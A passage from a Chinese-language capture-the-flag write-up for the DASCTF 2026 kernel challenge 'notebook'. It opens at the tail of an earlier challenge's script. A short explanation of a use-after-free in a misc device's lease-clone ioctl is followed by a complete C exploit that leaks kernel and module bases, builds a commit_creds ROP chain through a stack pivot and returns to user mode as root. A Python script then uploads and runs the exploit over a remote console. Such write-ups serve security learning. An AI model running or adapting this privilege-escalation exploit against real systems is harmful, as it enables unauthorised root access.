pay2=bytearray(0x2F0); pay2[0x178:0x178+0x178]=G
ck(0xA4,0x34,0,0,bytes(pay2))
r=c.fr(0x40,0,0,b'')
print('GATE RESP',hex(r['cmd']),r['plen'],r['payload'])
```

### notebook

notebook是一道 Linux 内核模块题。note.ko 是 misc 字符设备，权限为 0666，暴露约 40 个 ioctl；每次打开设备都会维护一组自定义缓存对象，包括封条、租约、通道、帧与分片，以及一个内含四指令虚拟机预言机和四个随机表项的编织对象。漏洞在租约克隆：ioctl 0x0e 克隆租约缓冲区时会释放旧缓冲区，却不更新包装对象中的指针，留下悬空指针；0x0f 是释放后使用读，0x10 是释放后使用写，作用域是控制与封条缓存。用一个门对象回收该槽位，可以泄露通道对象、通道中的随机字段以及随机数函数地址，从而推出内核基址，并可覆写门对象的关键字段；0x1b 会把门字段复制进通道，从而控制通道的关键属性。

随后解出编织对象的虚拟机预言机，用命令 0x24 到 0x27 创建通道，并通过 0x22 预言机泄露每次打开设备的 secret；最后计算 0x12 号间接调用的目标，设置为模块中的 endbr64、mov rsp,\[rdi+0x28\]、ret 栈枢轴 gadget，地址为模块基址加 0x4210。被编织的帧因此成为 ROP 栈：用 commit_creds(init_cred) 提权，再经 KPTI 跳板返回用户态，得到 root shell 读取 flag。本地在七次启动（含双核）中均成功提权；远程通过平台代理的一次投递即拿到 /root/flag，最终 flag 为 DASCTF{01037418648210783796590886755343}。本题入口是克隆时释放旧对象但未清指针的释放后使用，配合对象数组缓存复用把漏洞转成对门与通道字段的控制；编织虚拟机则提供受控的创建通道与泄露 secret 接口，最后借用模块自带的栈枢轴 gadget 把帧变成 ROP 栈。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

内核利用程序的代码如下。

```c
// notebook exploit - DASCTF 2026
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef unsigned char u8;

struct req { u32 a, b, len, c; u8 data[0xf8]; } __attribute__((packed));

static int fd;
static u64 user_rsp, user_rflags;
static u64 g_v225;

static inline u64 rol64(u64 x,int r){ r&=63; return r? (x<<r)|(x>>(64-r)) : x; }
static inline u64 ror64(u64 x,int r){ r&=63; return r? (x>>r)|(x<<(64-r)) : x; }
static inline u32 rol32(u32 x,int r){ r&=31; return r? (x<<r)|(x>>(32-r)) : x; }
static inline u32 ror32(u32 x,int r){ r&=31; return r? (x>>r)|(x<<(32-r)) : x; }

static u64 inv64(u64 a){ // modular inverse mod 2^64 (a odd)
    u64 x=a; // newton
    for(int i=0;i<6;i++) x *= 2 - a*x;
    return x;
}

static long req_ioctl(u32 cmd, struct req *r){
    long ret = ioctl(fd, cmd, r);
    return ret;
}

static void save_state(void){
    asm volatile("mov %%rsp,%0":"=r"(user_rsp));
    asm volatile("pushfq; pop %0":"=r"(user_rflags));
}

static void win(void);

static u64 K0 = 0x91D574A6C3E820BFULL;

// ---------------- VM sub_10 initial state ----------------
static void sub10(u64 l128, u64 l130, u64 o[4]){
    o[0] = l128 ^ rol64(l130,7) ^ 0x6A09E667F3BCC909ULL;
    o[1] = l130 - 0x4498517A7B3558C5ULL + rol64(l128,19);
    o[2] = ~(l128 - 0x61C8864E7A143579ULL * l130);
    o[3] = ror64(l130 ^ l128, 23) + 0x3C6EF372FE94F82BULL;
}
static int swap_m0[64]={0};

// ---------------- sub_C0 (32-bit regs) ----------------
static u32 run_C0(u64 l128, u64 l130, const u8 *p, int slot, u32 *flags){
    u64 o[4]; sub10(l128,l130,o);
    u32 v[4] = {(u32)o[0],(u32)o[1],(u32)o[2],(u32)o[3]};
    u32 fl=0;
    for(int i=0;i<8;i++){
        u32 op=p[8*i], i1=p[8*i+1], i2=p[8*i+2], rot=p[8*i+3];
        u32 imm; memcpy(&imm,p+8*i+4,4);
        if(op==1){ v[i1] += imm + rol32(v[i2],rot); }
        else if(op==2){ v[i1] ^= ror32(imm + v[i2], rot); }
        else if(op==3){ v[i1] = (imm ^ v[i1]) * (v[i2]|1); }
        else if(op==4){ v[i1] = rol32(imm + v[i1], rot) ^ v[i2]; }
        else if(op==5){ v[i1] += (v[i2] ^ imm) * 1717173651u; }
        else if(op==6){ v[i1] = (v[i2] * (imm|1)) ^ (imm + v[i1]); }
        else if(op==7){ v[i1] = (((v[i2] >> ((rot%31)+1)) + imm) ^ v[i1]) * 0x963ee407u; }
        else if(op==8){ if((s32)v[i1] < (s32)imm){ u32 t=v[i1]; v[i1]=v[i2]; v[i2]=t; fl |= 1u<<i; } }
        else if(op==9){ v[i1] = rol32(v[i2],rot) + (imm ^ v[i1]); }
        else { *flags=0x1ff; return 0x1ff; }
    }
    v[slot] ^= rol32(v[(slot+1)&3], 7*slot+13);
    u32 e = v[slot] ^ (v[(slot+3)&3] * 0x85ebca87u);
    e ^= e>>9; e ^= e>>23;
    *flags = fl;
    return e & 0x1ff;
}

// ---------------- sub_3A0 (64-bit regs) ----------------
static u64 run_3A0(u64 l128, u64 l130, const u8 *p, int slot, u32 *flags, u64 res[4]){
    u64 o[4]; sub10(l128,l130,o);
    u64 v[4] = {o[0],o[1],o[2],o[3]};
    u32 fl=0;
    for(int i=0;i<8;i++){
        u32 op=p[8*i], i1=p[8*i+1], i2=p[8*i+2], rot=p[8*i+3];
        u32 imm; memcpy(&imm,p+8*i+4,4);
        u64 I = (u64)imm;
        if(op==1){ v[i1] += I + rol64(v[i2],rot); }
        else if(op==2){ v[i1] ^= ror64(v[i2] + I, rot); }
        else if(op==3){ v[i1] = (I ^ v[i1]) * (v[i2]|1); }
        else if(op==4){ v[i1] = rol64(v[i1] + I, rot) ^ v[i2]; }
        else if(op==5){ v[i1] += 0xD6E8FEB86659FD93ULL * (v[i2] ^ I); }
        else if(op==6){ v[i1] = (v[i2] * (I|1)) ^ (v[i1] + I); }
        else if(op==7){ v[i1] = 0xA24BAED4963EE407ULL * (v[i1] ^ (I + (v[i2] >> ((rot%63)+1)))); }
        else if(op==8){ if(v[i1] < I){ u64 t=v[i1]; v[i1]=v[i2]; v[i2]=t; fl |= 1u<<i; } }
        else if(op==9){ v[i1] = (v[i1] ^ I) + rol64(v[i2],rot); }
        else { *flags=0x1ff; memcpy(res,v,32); return 0x1ff; }
    }
    v[slot] ^= rol64(v[(slot+1)&3], 7*slot+13);
    u64 x = v[slot] ^ (0x9E3779B185EBCA87ULL * v[(slot+3)&3]);
    x ^= x>>9; x ^= x>>23; x ^= x>>41;
    v[slot]=x;
    memcpy(res,v,32);
    *flags=fl;
    return x & 0x1ff;
}

// ---------------- program table (module .rodata+0x140) ----------------
static const u8 prog_tbl[128] = {
0x01,0x00,0x01,0x07,0x03,0x00,0x02,0x00,0x02,0x03,0x00,0x0b,0x04,0x00,0x03,0x11,0x05,0x02,0x00,0x09,0x06,0x00,0x02,0x05,0x07,0x01,0x00,0x0d,0x01,0x00,0x01,0x17,
0x02,0x01,0x03,0x09,0x05,0x01,0x00,0x06,0x03,0x02,0x01,0x00,0x04,0x01,0x02,0x1d,0x07,0x03,0x01,0x0f,0x06,0x01,0x03,0x07,0x01,0x00,0x01,0x15,0x02,0x01,0x00,0x1b,
0x09,0x00,0x01,0x0b,0x08,0x00,0x02,0x00,0x03,0x02,0x00,0x00,0x04,0x00,0x03,0x25,0x05,0x01,0x00,0x05,0x07,0x03,0x01,0x11,0x06,0x00,0x02,0x09,0x01,0x02,0x01,0x1f,
0x05,0x03,0x00,0x07,0x09,0x01,0x03,0x0d,0x08,0x01,0x02,0x00,0x06,0x02,0x01,0x0b,0x07,0x00,0x02,0x13,0x04,0x01,0x00,0x2b,0x03,0x03,0x01,0x00,0x02,0x03,0x01,0x19
};

static const u64 q45c0[8] = {0x243f6a8885a308d3ULL,0x13198a2e03707344ULL,0xa4093822299f31d0ULL,0x082efa98ec4e6c89ULL,0x452821e638d01377ULL,0xbe5466cf34e90c6cULL,0xc0ac29b7c97c50ddULL,0x3f84d5b5b5470917ULL};
static u64 rnd_state = 0x12345678;

static u64 rnd64(void){ rnd_state ^= rnd_state<<13; rnd_state ^= rnd_state>>7; rnd_state ^= rnd_state<<17; return rnd_state * 0x9e3779b97f4a7c15ULL; }

// find program for slot target: constraints on C0 flags cf, and 3A0 return target tgt
static int find_prog(int slot, u32 cf_required, u32 xor_required, u32 tgt, u64 l128, u64 l130, u8 out[64]){
    u8 p[64];
    for(long it=0; it<20000000L; it++){
        // interleave fixed dword0 per instruction with free immediate
        for(int i=0;i<8;i++){
            memcpy(p+8*i, prog_tbl + 32*slot + 4*i, 4);
            u32 imm = (u32)rnd64();
            memcpy(p+8*i+4,&imm,4);
        }
        u32 fc, f3; u64 res[4];
        u32 rc = run_C0(l128,l130,p,slot,&fc);
        u32 r3 = (u32)run_3A0(l128,l130,p,slot,&f3,res);
        if(rc>0xf8) continue;
        if(r3!=tgt) continue;
        if(fc!=cf_required) continue;
        if((fc ^ f3)!=xor_required) continue;
        memcpy(out,p,64);
        return 0;
    }
    return -1;
}

static int hexdump(const char*tag, u8*d, int n){ fprintf(stderr,"%s:",tag); for(int i=0;i<n;i++) fprintf(stderr,"%02x",d[i]); fprintf(stderr,"\n"); return 0; }

static void die(const char*msg){ fprintf(stderr,"[-] %s\n",msg); _exit(1); }

static void hexprint_local(void){}

static u64 flag_read_fn_addr;

static int setup_common(u64 *state0, u64 *state16, u64 *state2592){
    struct req r;
    // piece holder idx0
    memset(&r,0,sizeof r); if(req_ioctl(0x41086E06,&r)) die("piece");
    // journal+receipt idx0 <- piece0
    memset(&r,0,sizeof r); if(req_ioctl(0x41086E09,&r)) die("journal");
    // receipt write 64 bytes, first qword = our chosen v225
    u64 v225 = 0x1122334455667788ULL; g_v225 = v225;
    memset(&r,0,sizeof r); r.len=64; memcpy(r.data,&v225,8); if(req_ioctl(0x41086E0A,&r)) die("receipt write");
    // oracle
    memset(&r,0,sizeof r); r.len=32; if(req_ioctl(0xC1086E22,&r)) die("oracle");
    u64 o0,o1,o2,o3; memcpy(&o0,r.data,8); memcpy(&o1,r.data+8,8); memcpy(&o2,r.data+16,8); memcpy(&o3,r.data+24,8);
    u64 v171=o2, v173=o0, v174=o1;
    // invert rounds
    for(int i=7;i>=0;i--){
        u64 K=0x9E3779B185EBCA87ULL;
        u64 v172=(u64)(i+1)*K;
        u64 v175 = ror64(v171, i+7) ^ rol64(q45c0[i] ^ v225, i+3);
        // v174_i = ROR(v174_{i+1} ^ ROL(v173_{i+1}+v172+v175, i+11), i+7) ^ v175
        u64 old174 = v174 ^ rol64(v173 + v172 + v175, i+11);
        v173 = v173 - rol64(v175 ^ old174, i+7);
        v174 = old174;
    }
    u64 v222 = v173 ^ rol64(v171,17);
    u64 v7 = v174 - ror64(v171,13);
    *state0 = v222 ^ v7;
    *state16 = rol64(v7 ^ 0x6DB449A76F3A16C5ULL, 23);
    *state2592 = rol64(ror64(v7,11) ^ v171 ^ v225 ^ v222 ^ 0x27E49A1CB6835FD0ULL, 27);
    u64 chk = v171 ^ rol64(((rol64(v7,7) + v222) ^ v225), 29) ^ 0xD60B7E2A94C1358FULL;
    if(chk != o3){ fprintf(stderr,"[-] oracle self-check failed\n"); return -1; }
    return 0;
}


static int solve_oracle(const u64 o[4], u64 v225, u64 *state0, u64 *state16, u64 *state2592){
    u64 v171=o[2], v173=o[0], v174=o[1];
    for(int i=7;i>=0;i--){
        u64 K=0x9E3779B185EBCA87ULL;
        u64 v172=(u64)(i+1)*K;
        u64 v175 = ror64(v171, i+7) ^ rol64(q45c0[i] ^ v225, i+3);
        u64 old174 = v174 ^ rol64(v173 + v172 + v175, i+11);
        v173 = v173 - rol64(v175 ^ old174, i+7);
        v174 = old174;
    }
    u64 v222 = v173 ^ rol64(v171,17);
    u64 v7 = v174 - ror64(v171,13);
    *state0 = v222 ^ v7;
    *state16 = rol64(v7 ^ 0x6DB449A76F3A16C5ULL, 23);
    *state2592 = rol64(ror64(v7,11) ^ v171 ^ v225 ^ v222 ^ 0x27E49A1CB6835FD0ULL, 27);
    u64 chk = v171 ^ rol64(((rol64(v7,7) + v222) ^ v225), 29) ^ 0xD60B7E2A94C1358FULL;
    return chk != o[3];
}

static int do_loom(u64 state0, u64 state16, u64 state2592, u64 loom_q[4]){
    struct req r;
    // create loom
    memset(&r,0,sizeof r); if(req_ioctl(0x41086E23,&r)) die("loom create");
    // leak loom[0x128],loom[0x130]
    memset(&r,0,sizeof r); r.len=16; if(req_ioctl(0xC1086E24,&r)) die("loom leak");
    u64 l128,l130; memcpy(&l128,r.data,8); memcpy(&l130,r.data+8,8);
    fprintf(stderr,"[*] loom rand %llx %llx\n",(unsigned long long)l128,(unsigned long long)l130);
    // programs per slot: slot i must 3A0-ret to 0x100+8*i
    for(int slot=0;slot<4;slot++){
        u32 cf = (slot<2)?0:(slot==2?2:4);
        u32 xr = (slot<2)?0:(slot==2?2:4);
        u32 tgt = 0x100 + 8*slot;
        u8 prog[64];
        if(find_prog(slot,cf,xr,tgt,l128,l130,prog)) die("prog search");
        memset(&r,0,sizeof r); r.a=slot; r.len=64; memcpy(r.data,prog,64);
        if(req_ioctl(0x41086E25,&r)) die("prog submit");
        // 0x26 verify + oracle
        memset(&r,0,sizeof r); r.a=slot; r.len=8;
        if(req_ioctl(0xC1086E26,&r)) die("prog verify");
        u64 y; memcpy(&y,r.data,8);
        // recompute res[] and invert
        u32 fc,f3; u64 res[4];
        run_3A0(l128,l130,prog,slot,&f3,res);
        u64 pre1 = ror64(res[(slot+2)&3] + l130, slot*3+7) ^ rol64(res[(slot+1)&3] ^ l128, slot+11);
        u64 pre = ((2*(u64)slot + 0x9E3779B185EBCA87ULL) * res[slot]) ^ pre1;
        u64 rsi = ((slot+1) * 0x13198A2E03707344ULL) ^ l130;
        static const u64 mul[4] = {0xd6e8feb86659fd93ULL,0xa24baed4963ee407ULL,0x9fb21c651e98df25ULL,0xc6bc279692b5cc83ULL};
        u64 x = y;
        for(int i=4;i>=1;i--){
            x ^= ror64(rsi, i+2);
            x *= inv64(mul[i-1]);
            x = ror64(x, slot+9+7*(i-1));
            x -= rol64((u64)i * 0x243f6a8885a308d3ULL ^ l128, (slot+4+i)&63);
        }
        u64 q = x ^ pre;
        loom_q[slot]=q;
        fprintf(stderr,"[*] slot%d y=%llx q=%llx\n",slot,(unsigned long long)y,(unsigned long long)q);
    }
    // 0x27 mix
    u64 A = state0 ^ l128 ^ 0x8642F5D39A71C0BEULL;
    u64 B = state16 ^ l130 ^ 0x19AC73E6D4528FB1ULL;
    u64 rcx=A, rax=B;
    int r9=0xb, r10=0x11, r11=7;
    for(int i=0;i<4;i++){
        u64 q = loom_q[i];
        u64 r15 = (0x9E3779B185EBCA87ULL + 2ULL*i) * q + rcx;
        r15 = rol64(r15, r9); r9 += 5;
        u64 rdx = rol64(q, r10); r10 += 3;
        rdx += r15;
        rax ^= rdx;
        u64 mult = 0xD6E8FEB86659FD93ULL + 2ULL*i;
        rax *= mult;
        rcx = ror64(rax, r11); r11 += 1;
        rcx ^= r15;
    }
    memset(&r,0,sizeof r); r.len=16; memcpy(r.data,&rcx,8); memcpy(r.data+8,&rax,8);
    if(req_ioctl(0x41086E27,&r)) die("loom verify");
    // state2632
    u64 st2632 = ((rax + state0) ^ rol64(l128 ^ state16 ^ rcx, 23) ^ 0x5E7394C2A18BD60FULL);
    return 0;
}

static u64 g_state0,g_state16,g_state2592;
static u64 g_l128,g_l130;
static u64 g_channel, g_channel56, g_kbase, g_modbase, g_v147;

static void win(void){
    // we are root here
    char buf[512];
    const char *paths[] = {"/root/flag","/flag","/root/flag.txt","/flag.txt","/home/ctf/flag","/root/flag1",0};
    int got=0;
    for(int i=0; paths[i]; i++){
        int f=open(paths[i],O_RDONLY);
        if(f>=0){
            int n=read(f,buf,sizeof(buf)-1);
            if(n>0){ write(1,"FLAG[",5); write(1,paths[i],strlen(paths[i])); write(1,"]:",2); write(1,buf,n); write(1,"\n",1); got=1; }
            close(f);
        }
    }
    if(!got){ const char*m="[-] no flag file found\n"; write(1,m,strlen(m)); }
    write(1,"[+] root\n",10);
    _exit(0);
}

int main(int argc,char**argv){
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(0,&set); sched_setaffinity(0,sizeof(set),&set);
    save_state();
    fd=open("/dev/note",O_RDWR);
    if(fd<0){ perror("open"); return 1; }
    u64 s0,s16,s2592;
    if(setup_common(&s0,&s16,&s2592)) return 1;
    g_state0=s0; g_state16=s16; g_state2592=s2592;
    fprintf(stderr,"[*] state0=%llx state16=%llx state2592=%llx\n",(unsigned long long)s0,(unsigned long long)s16,(unsigned long long)s2592);

    // loom
    u64 loom_q[4];
    {
        struct req r;
        memset(&r,0,sizeof r); if(req_ioctl(0x41086E23,&r)) die("loom create");
        memset(&r,0,sizeof r); r.len=16; if(req_ioctl(0xC1086E24,&r)) die("loom leak");
        memcpy(&g_l128,r.data,8); memcpy(&g_l130,r.data+8,8);
        for(int slot=0;slot<4;slot++){
            u32 cf=(slot<2)?0:(slot==2?2:4), xr=cf, tgt=0x100+8*slot;
            u8 prog[64];
            if(find_prog(slot,cf,xr,tgt,g_l128,g_l130,prog)) die("prog search");
            memset(&r,0,sizeof r); r.a=slot; r.len=64; memcpy(r.data,prog,64);
            if(req_ioctl(0x41086E25,&r)) die("prog submit");
            memset(&r,0,sizeof r); r.a=slot; r.len=8;
            if(req_ioctl(0xC1086E26,&r)) die("prog verify");
            u64 y; memcpy(&y,r.data,8);
            u32 fc,f3; u64 res[4];
            run_3A0(g_l128,g_l130,prog,slot,&f3,res);
            u64 pre1 = ror64(res[(slot+2)&3] + g_l130, slot*3+7) ^ rol64(res[(slot+1)&3] ^ g_l128, slot+11);
            u64 pre = ((2*(u64)slot + 0x9E3779B185EBCA87ULL) * res[slot]) ^ pre1;
            u64 rsi = ((slot+1) * 0x13198A2E03707344ULL) ^ g_l130;
            static const u64 mul[4] = {0xd6e8feb86659fd93ULL,0xa24baed4963ee407ULL,0x9fb21c651e98df25ULL,0xc6bc279692b5cc83ULL};
            u64 x=y;
            for(int i=4;i>=1;i--){
                x ^= ror64(rsi,i+2);
                x *= inv64(mul[i-1]);
                x = ror64(x, slot+9+7*(i-1));
                x -= rol64((u64)i*0x243f6a8885a308d3ULL ^ g_l128, (slot+4+i)&63);
            }
            loom_q[slot] = x ^ pre;
            fprintf(stderr,"[*] slot%d q=%llx\n",slot,(unsigned long long)loom_q[slot]);
        }
        // refresh loom reads before mix (stability)
        { struct req q1; memset(&q1,0,sizeof q1); q1.len=16; if(!req_ioctl(0xC1086E24,&q1)){ memcpy(&g_l128,q1.data,8); memcpy(&g_l130,q1.data+8,8);} }
        { struct req o2; memset(&o2,0,sizeof o2); o2.len=32;
          if(!req_ioctl(0xC1086E22,&o2)){
            u64 oo[4]; memcpy(oo,o2.data,32);
            u64 f0,f16,f2592;
            if(!solve_oracle(oo,g_v225,&f0,&f16,&f2592)){
              fprintf(stderr,"[*] oracle2: s0=%llx s16=%llx s2592=%llx (first: %llx %llx %llx)\n",
                (unsigned long long)f0,(unsigned long long)f16,(unsigned long long)f2592,
                (unsigned long long)s0,(unsigned long long)s16,(unsigned long long)s2592);
              s0=f0; s16=f16; s2592=f2592;
            } else fprintf(stderr,"[!] oracle2 self-check failed\n");
          }
        }
        u64 A = s0 ^ g_l128 ^ 0x8642F5D39A71C0BEULL;
        u64 B = s2592 ^ g_l130 ^ 0x19AC73E6D4528FB1ULL;
        u64 rcx=A, rax=B; int r9=0xb,r10=0x11,r11=7;
        for(int i=0;i<4;i++){
            u64 q=loom_q[i];
            u64 r15 = (0x9E3779B185EBCA87ULL + 2ULL*i)*q + rcx;
            r15 = rol64(r15,r9); r9+=5;
            u64 rdx = rol64(q,r10); r10+=3; rdx += r15;
            rax ^= rdx;
            rax *= (0xD6E8FEB86659FD93ULL + 2ULL*i);
            rcx = ror64(rax,r11); r11+=1; rcx ^= r15;
        }
        memset(&r,0,sizeof r); r.len=16; memcpy(r.data,&rcx,8); memcpy(r.data+8,&rax,8);
        long lv=req_ioctl(0x41086E27,&r);
        if(lv){
            // retry: recompute exactly as calibration (fresh loops, candidate a=0,b=0)
            u64 C1=0x8642F5D39A71C0BEULL, C2=0x19AC73E6D4528FB1ULL;
            u64 rc2=s0^g_l128^C1, ra2=s2592^g_l130^C2;
            u64 rr9=0xb,rr10=0x11,rr11=7;
            for(int i=0;i<4;i++){ u64 q=loom_q[i];
                u64 r15=(0x9E3779B185EBCA87ULL+2ULL*i)*q+rc2; r15=rol64(r15,rr9); rr9+=5;
                u64 rd=rol64(q,rr10); rr10+=3; rd+=r15; ra2^=rd; ra2*=(0xD6E8FEB86659FD93ULL+2ULL*i);
                rc2=ror64(ra2,rr11); rr11+=1; rc2^=r15; }
            fprintf(stderr,"[-] 0x27 errno=%d first rcx=%llx rax=%llx | cand rc=%llx ra=%llx Ac=%llx Bc=%llx l128=%llx l130=%llx\n",
                errno,(unsigned long long)rcx,(unsigned long long)rax,(unsigned long long)rc2,(unsigned long long)ra2,
                (unsigned long long)(s0^g_l128^C1),(unsigned long long)(s2592^g_l130^C2),
                (unsigned long long)g_l128,(unsigned long long)g_l130);
            memset(&r,0,sizeof r); r.len=16; memcpy(r.data,&rc2,8); memcpy(r.data+8,&ra2,8);
            lv=req_ioctl(0x41086E27,&r);
            if(lv){ fprintf(stderr,"[-] 0x27 retry failed errno=%d\n",errno); die("loom verify"); }
            fprintf(stderr,"[+] 0x27 retry OK\n");
            rcx=rc2; rax=ra2;
        }
        u64 st2632 = ((rax + s0) ^ rol64(g_l128 ^ s16 ^ rcx,23) ^ 0x5E7394C2A18BD60FULL);
        // create channel idx0
        memset(&r,0,sizeof r); r.len=16; memcpy(r.data,&s16,8); memcpy(r.data+8,&st2632,8);
        if(req_ioctl(0x41086E11,&r)) die("channel create");
    }
    fprintf(stderr,"[+] channel created\n");
    // route frame idx0, then clone to bump counter
    {
        struct req r;
        memset(&r,0,sizeof r); r.len=0x28; if(req_ioctl(0x41086E13,&r)) die("frame create");
        memset(&r,0,sizeof r); r.a=0; if(req_ioctl(0x41086E14,&r)) die("frame clone");
    }
    // class0 lease at 0, clone
    {
        struct req r;
        memset(&r,0,sizeof r); r.a=0;r.b=0;r.len=0x28; if(req_ioctl(0x41086E0D,&r)) die("lease0 create");
        memset(&r,0,sizeof r); r.a=0; if(req_ioctl(0x41086E0E,&r)) die("lease0 clone");
        // gate at 0
        memset(&r,0,sizeof r); r.a=0;r.b=0; if(req_ioctl(0x41086E19,&r)) die("gate create");
        // leak gate
        memset(&r,0,sizeof r); r.a=0;r.len=0x28; if(req_ioctl(0xC1086E0F,&r)) { hexdump("gateleak",r.data,0x28); die("gate leak"); }
        u64 g32,g40,g48,g56,g64;
        memcpy(&g32,r.data,8); memcpy(&g40,r.data+8,8); memcpy(&g48,r.data+16,8); memcpy(&g56,r.data+24,8); memcpy(&g64,r.data+32,8);
        fprintf(stderr,"[*] gate: %llx %llx %llx %llx %llx\n",(unsigned long long)g32,(unsigned long long)g40,(unsigned long long)g48,(unsigned long long)g56,(unsigned long long)g64);
        g_channel = g56 ^ rol64(s0,9);
        g_channel56 = g40;
        g_v147 = rol64(g_channel56 ^ g_channel ^ s0 ^ s16, 29);
        g_modbase = (g32 ^ g_v147) - 0x760;
        u64 grnd = g48;
        g_kbase = grnd - 0x6b0b20;
        fprintf(stderr,"[*] channel=%llx channel56=%llx v147=%llx modbase=%llx kbase=%llx\n",
            (unsigned long long)g_channel,(unsigned long long)g_channel56,(unsigned long long)g_v147,(unsigned long long)g_modbase,(unsigned long long)g_kbase);
        if((g_kbase & 0xfffff) != 0) fprintf(stderr,"[!] kbase alignment suspicious\n");
        // hijack channel[32] via gate[32] BEFORE weaving (hash binds channel[32])
        u64 pivot = g_modbase + 0x4210;
        u64 gval = pivot ^ g_v147;
        fprintf(stderr,"[*] pivot=%llx gate32=%llx\n",(unsigned long long)pivot,(unsigned long long)gval);
        memset(&r,0,sizeof r); r.a=0;r.len=8; memcpy(r.data,&gval,8);
        if(req_ioctl(0x41086E10,&r)) die("uaf write");
        // 0x1B: channel[32]=gate[32], gate class=2
        memset(&r,0,sizeof r); r.a=0;r.len=16; memcpy(r.data,&s16,8); memcpy(r.data+8,&s2592,8);
        if(req_ioctl(0x41086E1B,&r)) die("0x1b push");
        fprintf(stderr,"[+] channel[32] hijacked\n");
    }
    // build 0x1C leak and weave
    {
        struct req r;
        memset(&r,0,sizeof r); r.a=0;r.b=0;r.len=8; if(req_ioctl(0xC1086E1C,&r)) die("0x1c leak");
        u64 out; memcpy(&out,r.data,8);
        u64 frame16 = ror64(out ^ 0xC681F7B23A49D50EULL,19) ^ g_channel56;
        u64 v237_17 = rol64(frame16 ^ g_channel56 ^ s16, 29) ^ 0xA7E35C819B04D26FULL;
        fprintf(stderr,"[*] frame16=%llx v237_17=%llx\n",(unsigned long long)frame16,(unsigned long long)v237_17);
        memset(&r,0,sizeof r); r.a=0;r.b=0;r.len=16; memcpy(r.data,&s16,8); memcpy(r.data+8,&v237_17,8);
        if(req_ioctl(0x41086E17,&r)) die("weave create");

        // ROP chain
        u64 kbase=g_kbase;
        u64 pop_rdi = kbase + 0x142d79;
        u64 commit_creds = kbase + 0xc19b0;
        u64 init_cred = kbase + 0x1a52fa0;
        u64 tramp = kbase + 0x10016b0 + 0x1b;
        u64 chain[25];
        memset(chain,0,sizeof chain);
        chain[0]=pop_rdi; chain[1]=init_cred; chain[2]=commit_creds; chain[3]=tramp;
        chain[18]=0; chain[20]=(u64)&win; chain[21]=0x33; chain[22]=user_rflags; chain[23]=user_rsp; chain[24]=0x2b;
        // shard keys
        u64 ch72 = v237_17;
        for(int i=0;i<4;i++){
            u64 key = rol64(ch72 ^ frame16 ^ ((u64)(i+1)*K0), i+7);
            memset(&r,0,sizeof r); r.a=0; r.b=i; r.len=72;
            memcpy(r.data,&key,8);
            // 8 data qwords from chain
            int base=i*8;
            for(int j=0;j<8;j++){
                u64 val = (base+j<25)? chain[base+j] : 0x4141414141414141ULL;
                memcpy(r.data+8+8*j,&val,8);
            }
            long rr=req_ioctl(0x41086E1D,&r);
            if(rr) { fprintf(stderr,"[-] shard%d fill=%ld\n",i,rr); die("shard fill"); }
        }
        // flatten
        memset(&r,0,sizeof r); r.a=0;r.len=8; memcpy(r.data,&ch72,8);
        if(req_ioctl(0x41086E1E,&r)) die("flatten");
        fprintf(stderr,"[+] woven frame ready\n");
        // class1 lease + clone
        memset(&r,0,sizeof r); r.a=1;r.b=1;r.len=0x28; if(req_ioctl(0x41086E0D,&r)) die("lease1 create");
        memset(&r,0,sizeof r); r.a=1; if(req_ioctl(0x41086E0E,&r)) die("lease1 clone");
        // seal42 create (idx0, lease1, frame0)
        memset(&r,0,sizeof r); r.a=0;r.b=1;r.c=0; if(req_ioctl(0x41086E1F,&r)) die("seal42 create");
        // 0x20 refresh
        u64 v237_20 = ror64(frame16 ^ g_channel56 ^ ch72 ^ 0x6C51F08AB27D934EULL, 27);
        memset(&r,0,sizeof r); r.a=0;r.len=16; memcpy(r.data,&ch72,8); memcpy(r.data+8,&v237_20,8);
        if(req_ioctl(0x41086E20,&r)) die("seal42 refresh");
        // 0x21 finalize
        memset(&r,0,sizeof r); r.a=0;r.len=16; memcpy(r.data,&ch72,8); memcpy(r.data+8,&v237_20,8);
        if(req_ioctl(0x41086E21,&r)) die("seal42 finalize");
        fprintf(stderr,"[+] launching call\n");
        // 0x12 call
        memset(&r,0,sizeof r); r.a=0;r.len=8; memcpy(r.data,&s16,8);
        req_ioctl(0x41086E12,&r);
        fprintf(stderr,"[-] call returned: %d\n", errno);
    }
    return 0;
}
```

远程投递脚本的代码如下。

```python
#!/usr/bin/env python3
# Deliver exploit_min over a raw TCP serial console and print the flag.
import socket, sys, time, re
host=sys.argv[1]; port=int(sys.argv[2])
payload=open('/tmp/payload.uu','rb').read()
s=socket.create_connection((host,port), timeout=10)
s.settimeout(1.0)
buf=b''
def pump(t=1.0, total=None):
    global buf
    end=time.time()+ (total if total else t)
    while time.time()<end:
        try:
            d=s.recv(65536)
            if not d: break
            buf+=d
        except socket.timeout:
            pass
print('[*] connected, waiting for boot/shell...')
t0=time.time(); got=False
while time.time()-t0 < 40:
    pump(0.5)
    if any(m in buf for m in [b'kernelprobe ready', b'uid=1000', b'/$', b'~ $', b'# ']):
        got=True; break
print('[*] stage1', 'ok' if got else 'timeout')
time.sleep(0.5); s.sendall(b'\n'); pump(0.5)
s.sendall(b'id; echo __M1__\n'); pump(1.0)
s.sendall(b"cat > /tmp/p.uu <<'EOF'\n")
for i in range(0,len(payload),2048):
    s.sendall(payload[i:i+2048]); time.sleep(0.03)
if not payload.endswith(b'\n'): s.sendall(b'\n')
s.sendall(b'EOF\n'); time.sleep(0.5); pump(1.0)
s.sendall(b'uudecode -o /tmp/x /tmp/p.uu 2>/dev/null; chmod +x /tmp/x; ls -l /tmp/x; /tmp/x\n')
print('[*] exploit sent, waiting for root...')
t0=time.time()
while time.time()-t0<30:
    pump(1.0)
    if b'FLAG[' in buf or b'no flag file' in buf or b'[+] root' in buf:
        break
# now we should be at a root shell (exploit execve /bin/sh -i)
s.sendall(b'\nid; echo __ROOT__; for f in /root/flag /flag /root/flag.txt /flag.txt /home/ctf/flag; do echo "== $f"; cat $f 2>/dev/null; done; echo __FIND__; find / -maxdepth 4 -iname "*flag*" 2>/dev/null; echo __DONE__\n')
t0=time.time()
while time.time()-t0<20:
    pump(1.0)
    if b'__DONE__' in buf: break
s.close()
txt=buf.decode('utf-8','replace')
